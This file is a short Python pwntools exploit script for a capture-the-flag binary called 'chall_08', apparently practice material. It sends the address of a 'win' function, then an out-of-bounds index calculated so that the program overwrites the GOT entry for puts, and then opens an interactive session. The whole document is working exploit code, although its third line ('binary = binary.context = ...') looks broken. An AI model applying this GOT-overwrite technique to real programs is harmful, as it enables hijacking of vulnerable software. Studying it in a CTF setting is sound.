from pwn import *
p = process('./chall_08')
binary = binary.context = ELF('./chall_08')
payload = bytes(str(binary.sym.win),'utf-8')
p.sendline(payload)
offset = bytes(str((binary.got.puts - binary.sym.target) // 8),'utf-8')
p.sendline(offset)
p.interactive()
